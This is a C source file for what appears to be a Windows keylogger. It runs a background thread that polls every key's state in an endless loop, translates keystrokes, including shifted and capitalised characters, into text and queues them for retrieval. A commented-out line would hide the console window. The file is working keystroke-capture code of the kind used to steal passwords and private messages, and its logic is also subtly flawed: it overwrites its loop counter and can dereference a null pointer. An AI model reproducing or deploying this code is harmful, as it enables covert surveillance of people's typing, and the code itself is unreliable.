#include<stdio.h>
#include<windows.h>
#include "keylogger.h"

queue* init_queue(){
    queue* q = (queue*)malloc(sizeof(queue));
	q->front = q->rear = NULL;
	return q;
}

node* create_new_node(char* value){
    node* tmp = (node*)malloc(sizeof(node));
    strcpy(tmp->key, value);
    tmp->next = NULL;
    return tmp;
}

int enqueue(queue* q, char* value){
    node* tmp = create_new_node(value);
    if (q->rear==NULL){
        q->front = q->rear = tmp;
        return 0;
    }
    q->rear->next = tmp;
    q->rear = tmp;
    return 0;
}

node* dequeue(queue* q){
    if(q->front ==NULL){
        return NULL;
    }
    node* tmp = q->front;

    q->front = q->front->next;
    if(q->front==NULL){
        q->rear=NULL;
    }
    return tmp;
}



DWORD WINAPI keylogthread(void* args){
    queue* q = args;
    keylog(q);
    return 0;
}

HANDLE start_keylog_thread(queue* q){
    HANDLE thread = CreateThread(NULL,0, keylogthread, q, 0, NULL);
    return thread;
}

int get_keylog(queue* q, char* key){
    node* key_pointer;
    key_pointer = dequeue(q);
    if(key_pointer->key !=NULL){
        strcpy(key,key_pointer->key);
        free(key_pointer);
        key_pointer = NULL;
        return 1;
    }
    else{
        return 0;
    }
}

void keylog(queue* q)
{
	//https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
	char* virtualKeyCodes[] = {"","<Left-Mouse>;","<Right-Mouse>;","<Cancel>;","<Middle-Mouse>;","<X1-Mouse>;",
	"<X2-Mouse>;","","<BackSpace>;","	","","","<Clear>;","<Enter>;","","","<Shift>;","<CTRL>;","<ALT>;",
	"<Pause>;","<Caps-Lock>;","<IME-Hangul-Mode>;","","<IME-Junja>;","<IME-Final>;","<IME-Hanja>;",
	"","<ESC>;","<IME-Conver>;","<IME-NonConver>;","<IME-Accept>;","<IME-Mode-Change-Request>;"," ","<Page-Up>;",
	"<Page-Down>;","<End>;","<Home-Key>;","<Left-Arrow>;","<Up-Arrow>;","<Right-Arrow>;","<Down-Arrow>;",
	"<Select>;","<Print-Key>;","<Execute-Key>;","<Print-Screen>;","<INS>;","<Delete>;","<Help>;","0",
	"1","2","3","4","5","6","7","8","9","","","","","","","","a","b","c","d","e","f","g","h","i","j","k",
	"l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","<Left-Windows-Key>;","<Right-Windows-Key>;","<Application-Key>;",
	"","<Computer-Sleep>;","0","1","2","3","4","5","6","7","8","9","*","+","|","-",".","/","<F1>;","<F2>;","<F3>;","<F4>;",
	"<F5>;","<F6>;","<F7>;","<F8>;","<F9>;","<F10>;","<F11>;","<F12>;","<F13>;","<F14>;","<F15>;","<F16>;","<F17>;","<F18>;",
	"<F19>;","<F20>;","<F21>;","<F22>;","<F23>;","<F24>;","","","","","","","","","<Num-Lock>;",
	"<Scroll-Lock>;","","","","","","","","","","","","","","","","","","<Control>;","<Control>;","<Menue>;","<Menue>;",
	"<Browser Back>;","<Browser Forward>;","<Browser Refresh>;","<Browser Stop>;","<Browser Search>;","<Browser Favorite>;",
	"<Browser Home>;","<Volume Mute>;","<Volume Down>;","<Volume Up>;", "<New Track>;","<Previous Track>;",
	"<Play/Pause>;","<Start Mail>;","<Select Media>;","<Start Application 1>;","<Start Application 2>;",
	NULL,NULL,";","=",",","-",".","/","`","","","","","","","","","","","","","","","","","","","","","","","","","","","[",
	"\\","]","'","","","","< [ OR / >;","","","<IME-Process>;","","","","","","","","","","","","","","","",
	"<Attn>;", "<CrSel>;","<ExSel>;","<Erase>;","<Play>;","<Zoom>;","","<PA1>;","<Clear>;"};

	char* virtualKeyCodesUpercase[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V",
	"W","X","Y","Z"};
	char* virtualKeyCodesShiftNum[] = {")","!","@","#","$","%","^","&","*","("};
	char* virtualKeyCodesShiftSpecialOne[] = {":","+","<","_",">","?","~"};
	char* virtualKeyCodesShiftSpecialTwo[] = {"{","|","}","\""};

	int virtualKeyCodesSize = sizeof(virtualKeyCodes) / sizeof(char *); // get number of elements in array
	int i = 1; //Loop Counter Vkeys
	int j = 0; // holds value of  i
	char* key; //virtualKeyCodes index value
	int capsOn = 0; //Cap lock is toogled
	int shiftOn = 0; // Shift is being pressed
	int shiftPressed; // Check if shift is pressed

	while(1)
	{
		//ShowWindow(GetConsoleWindow(), SW_HIDE);
		for(i=1;i<255;i++)
		{

			//get key press
			if(GetAsyncKeyState(i) == -32767) // 1 = press , -32767 = held down
			{
				
				// check if CAP Lock is on
				capsOn = GetKeyState(VK_CAPITAL);

				//check if Shift is pressed
				shiftOn = 0;
				shiftPressed = GetKeyState(VK_SHIFT);
				if(shiftPressed  == -127 || shiftPressed == -128)
				{
						shiftOn = 1;
				}


                // capital letters
                if((capsOn && !shiftOn && i <= 90 && i >=65) || (shiftOn && !capsOn && i <= 90 && i >=65))
                {
                    i -= 65; //adjust i to new array
                    enqueue(q,virtualKeyCodesUpercase[i]);
                }
                //Shift Number EX:!@#$%^&*()
                else if(shiftOn &&  i <= 57 && i >=48)
                {
                    i -= 48; //adjust i to new array
                    enqueue(q,virtualKeyCodesShiftNum[i]);
                }

                else if(shiftOn &&  i <= 192 && i >= 186)
                {
                    i -= 186; //adjust i to new array
                    enqueue(q,virtualKeyCodesShiftSpecialOne[i]);
                }

                else if(shiftOn &&  i <= 222 && i >=219)
                {
                    i -= 219; //adjust i to new array
                    enqueue(q,virtualKeyCodesShiftSpecialTwo[i]);
                }

                //regular characters
                else
                {
                    enqueue(q,virtualKeyCodes[i]);
                }
			}
		}
	}
}

